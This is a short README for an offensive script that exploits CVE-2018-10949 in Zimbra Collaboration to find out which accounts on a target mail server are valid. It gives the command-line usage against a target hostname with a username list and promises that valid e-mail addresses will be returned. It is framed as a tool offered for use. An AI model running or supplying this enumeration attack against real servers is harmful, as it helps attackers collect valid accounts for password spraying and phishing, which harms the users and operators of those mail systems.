# Zimbra Collaboration User Enumeration Script (CVE-2018-10949)

## How to use

The argument --host must be the hostname or IP address of Zimbra Collaboration Web Application root page, and --userlist an list of usernames to check against it.
```
root@kali# ./cve-2018-10949-user-enum.py --host http://mail.target.com --userlist /tmp/emails.txt
```

And it should spill out valid e-mails!

References: https://www.cvedetails.com/cve/CVE-2018-10949
